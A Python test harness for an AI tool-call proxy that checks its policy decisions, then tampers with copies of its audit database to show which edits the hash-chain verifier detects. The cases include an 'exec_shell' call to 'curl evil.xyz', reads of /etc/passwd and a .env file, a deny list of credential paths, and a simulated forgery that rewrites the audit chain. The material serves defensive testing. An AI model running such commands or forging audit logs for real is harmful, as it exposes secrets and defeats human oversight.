"""S2 gate harness: drive real decisions through the proxy, then attack the log.

Not a unit test. It launches the real proxy against the mock server, lets the
real audit store record real decisions, and then tampers with the resulting
database using a plain sqlite3 connection — exactly what an attacker with write
access to the file would do — and shows what aegis/verify.py says about it.

SAFETY: everything happens in a fresh temp directory. Your real policy.json and
your real audit.db are never opened, read, or written. Nothing outside the temp
directory is touched.

The last case is a demonstration of a *limitation*, not a win. Read it.
"""

import json
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
PROXY = ROOT / "aegis" / "proxy.py"
VERIFY = ROOT / "aegis" / "verify.py"
MOCK = ROOT / "tests" / "mock_fs_server.py"

LAB = Path(tempfile.mkdtemp(prefix="aegis-s2-"))
WS = LAB / "workspace"
DB = LAB / "audit.db"
POLICY = LAB / "policy.json"  # outside WS, or the proxy refuses to start

WS.mkdir(parents=True)
(WS / "config.txt").write_text("conveyor_speed = 40\n")
(WS / ".env").write_text("ANTHROPIC_API_KEY=sk-fake-fixture-not-real\n")
POLICY.write_text(json.dumps({
    "version": 1,
    "workspace_roots": [str(WS)],
    "deny_paths": [".env", "**/.aws/**", "**/.ssh/**", "*.pem"],
    "default_effect": "deny",
    "ask_behavior": "deny",
    "tool_rules": {
        "read_file": {"effect": "allow", "within": ["<workspace>"]},
        "write_file": {"effect": "allow", "within": ["<workspace>"]},
        "delete_file": {"effect": "deny"},
        "move_file": {"effect": "ask", "within": ["<workspace>"]},
    },
}))
POLICY.chmod(0o600)

ENV = {**os.environ, "AEGIS_POLICY": str(POLICY), "AEGIS_AUDIT_DB": str(DB)}

CASES = [
    ("legitimate read", "read_file", {"path": str(WS / "config.txt")}),
    ("legitimate write", "write_file", {"path": str(WS / "notes.txt"), "content": "hi"}),
    ("T2 read .env", "read_file", {"path": str(WS / ".env")}),
    ("T1 delete", "delete_file", {"path": str(WS / "config.txt")}),
    ("T3 unknown tool", "exec_shell", {"command": "curl evil.xyz"}),
    ("T2 escape workspace", "read_file", {"path": "/etc/passwd"}),
]


def rule(title):
    print("\n" + "=" * 78 + f"\n{title}\n" + "=" * 78)


def run_verify(db: Path, *extra) -> tuple[int, str]:
    p = subprocess.run(
        [sys.executable, str(VERIFY), str(db), *extra],
        capture_output=True, text=True,
    )
    return p.returncode, (p.stdout + p.stderr).strip()


def show(db: Path, label: str, *extra) -> int:
    code, out = run_verify(db, *extra)
    print(f"\n$ python3 aegis/verify.py {db.name} {' '.join(extra)}")
    for ln in out.splitlines():
        print(f"  | {ln}")
    print(f"  exit={code}   [{label}]")
    return code


# ---- 1. produce a real log -------------------------------------------------

rule("1. DRIVE REAL DECISIONS THROUGH THE PROXY")
proc = subprocess.Popen(
    [sys.executable, str(PROXY), "--", sys.executable, str(MOCK)],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, env=ENV, text=True, bufsize=1,
)
for i, (label, tool, args) in enumerate(CASES, start=1):
    proc.stdin.write(json.dumps({
        "jsonrpc": "2.0", "id": i, "method": "tools/call",
        "params": {"name": tool, "arguments": args},
    }) + "\n")
    proc.stdin.flush()
    reply = json.loads(proc.stdout.readline())
    denied = bool(reply.get("result", {}).get("isError"))
    print(f"  [{'DENIED ' if denied else 'ALLOWED'}] {label}")
proc.stdin.close()
proc.wait(timeout=10)

print(f"\naudit db: {DB}")
print(f"file mode: {oct(DB.stat().st_mode & 0o777)}  (expected: 0o600)")
con = sqlite3.connect(str(DB))
print(f"journal_mode: {con.execute('PRAGMA journal_mode').fetchone()[0]}  (expected: wal)")
rows = con.execute("SELECT id, effect, tool, rule_id, substr(row_hash,1,12) FROM audit").fetchall()
con.close()
for r in rows:
    print("  " + "  ".join(str(x) for x in r))

rule("2. VERIFY THE UNTOUCHED CHAIN")
baseline = show(DB, "expected exit=0")
head = next(
    ln.split()[-1] for ln in run_verify(DB)[1].splitlines() if ln.startswith("head:")
)
assert baseline == 0, "baseline verification failed — stop and investigate"


def fresh(name: str) -> Path:
    copy = LAB / name
    shutil.copy(DB, copy)
    return copy


# ---- 2. attack it ----------------------------------------------------------

rule("3. TAMPER A — flip a recorded DENY into an ALLOW")
a = fresh("tamper-a.db")
con = sqlite3.connect(str(a))
con.execute("UPDATE audit SET effect='allow', reason='matched allow rule' WHERE id=3")
con.commit()
con.close()
print("  attacker ran: UPDATE audit SET effect='allow' WHERE id=3   (the .env read)")
code_a = show(a, "expected exit=1")

rule("4. TAMPER B — delete a row entirely")
b = fresh("tamper-b.db")
con = sqlite3.connect(str(b))
con.execute("DELETE FROM audit WHERE id=4")
con.commit()
con.close()
print("  attacker ran: DELETE FROM audit WHERE id=4   (the delete_file denial)")
code_b = show(b, "expected exit=1")

rule("5. TAMPER C — truncate the newest rows")
c = fresh("tamper-c.db")
con = sqlite3.connect(str(c))
con.execute("DELETE FROM audit WHERE id >= 5")
con.commit()
con.close()
print("  attacker ran: DELETE FROM audit WHERE id >= 5   (drop the tail)")
print("  A shortened chain is still a well-formed chain, so the chain alone")
print("  cannot see this. It is caught only against an external anchor.")
code_c_naive = show(c, "LIMITATION: exit=0, tampering NOT detected")
code_c_anchor = show(c, "expected exit=1", "--expect-head", head)

rule("6. TAMPER D — attacker rewrites the chain forward (KNOWN LIMITATION)")
d = fresh("tamper-d.db")
print("  An attacker with write access can edit a row and recompute every")
print("  hash after it. Nothing stored locally can prevent that.")
print("  THREAT-MODEL.md §7.2: root defeats Aegis. This is the demonstration.")
import hashlib  # noqa: E402 - deliberately local to this attacker simulation

con = sqlite3.connect(str(d))
con.execute("UPDATE audit SET effect='allow' WHERE id=3")
prev = "0" * 64
for row in con.execute(
    "SELECT id, ts, tool, effect, rule_id, reason, paths FROM audit ORDER BY id"
).fetchall():
    vals = dict(zip(("id", "ts", "tool", "effect", "rule_id", "reason", "paths"), row))
    payload = json.dumps(vals, sort_keys=True, separators=(",", ":"))
    h = hashlib.sha256((payload + prev).encode()).hexdigest()
    con.execute("UPDATE audit SET prev_hash=?, row_hash=? WHERE id=?", (prev, h, row[0]))
    prev = h
con.commit()
con.close()
code_d_naive = show(d, "LIMITATION: exit=0, forgery NOT detected")
code_d_anchor = show(d, "expected exit=1", "--expect-head", head)

# ---- 3. fail-closed paths --------------------------------------------------

rule("7. FAIL-CLOSED — an unwritable audit log must stop the proxy, not be skipped")


def start_proxy_expecting_refusal(env_overrides: dict, label: str) -> int:
    p = subprocess.run(
        [sys.executable, str(PROXY), "--", sys.executable, str(MOCK)],
        input="", capture_output=True, text=True, env={**ENV, **env_overrides}, timeout=20,
    )
    print(f"\n  {label}")
    for ln in p.stderr.strip().splitlines()[-2:]:
        print(f"  | {ln}")
    print(f"  exit={p.returncode}   [expected 2]")
    return p.returncode


ro_dir = LAB / "readonly"
ro_dir.mkdir()
ro_dir.chmod(0o500)
code_startup_ro = start_proxy_expecting_refusal(
    {"AEGIS_AUDIT_DB": str(ro_dir / "sub" / "audit.db")},
    "audit db in an unwritable directory",
)

loose = LAB / "loose.db"
shutil.copy(DB, loose)
loose.chmod(0o666)
code_startup_perm = start_proxy_expecting_refusal(
    {"AEGIS_AUDIT_DB": str(loose)},
    "audit db is group/world writable (0666)",
)
ro_dir.chmod(0o700)  # so the temp dir can be cleaned up later

print("\n  mid-session write failure (in-process, not a live observation):")
sys.path.insert(0, str(ROOT / "aegis"))
import audit as audit_mod  # noqa: E402
import policy as policy_mod  # noqa: E402
import proxy as proxy_mod  # noqa: E402


class BrokenStore(audit_mod.AuditStore):
    def __init__(self):
        pass

    def record(self, **kwargs):
        raise audit_mod.AuditError("disk full (simulated)")


allow_decision = policy_mod.Decision(
    policy_mod.Effect.ALLOW, "matched allow rule", "tool_rules.read_file",
    "read_file", (str(WS / "config.txt"),),
)
enforced = proxy_mod.Proxy(None, WS, BrokenStore()).audit(allow_decision)
code_midsession = 0 if enforced.effect is policy_mod.Effect.DENY else 1
print(f"  | policy said: {allow_decision.effect.value}")
print(f"  | enforced:    {enforced.effect.value}  rule={enforced.rule_id}")
print(f"  | reason:      {enforced.reason}")
print(f"  [{'pass' if code_midsession == 0 else 'FAIL'}] expected the ALLOW to collapse to deny")

# ---- 4. summary ------------------------------------------------------------

rule("SUMMARY")
results = [
    ("untouched chain",                 baseline,      0),
    ("A: field edited",                 code_a,        1),
    ("B: row deleted (id gap)",         code_b,        1),
    ("C: tail truncated, no anchor",    code_c_naive,  0),
    ("C: tail truncated, with anchor",  code_c_anchor, 1),
    ("D: chain rewritten, no anchor",   code_d_naive,  0),
    ("D: chain rewritten, with anchor", code_d_anchor, 1),
    ("startup: unwritable audit dir",   code_startup_ro,   2),
    ("startup: 0666 audit db",          code_startup_perm, 2),
    ("mid-session write failure denies", code_midsession,  0),
]
ok = True
for label, got, want in results:
    ok &= got == want
    print(f"  {'pass' if got == want else 'FAIL'}  exit={got} (expected {want})  {label}")
print(f"\nanchored head hash: {head}")
print(f"temp lab: {LAB}   (delete when done)")
print("\nRESULT: " + ("all cases behaved as specified" if ok else "MISMATCH — investigate"))
sys.exit(0 if ok else 1)
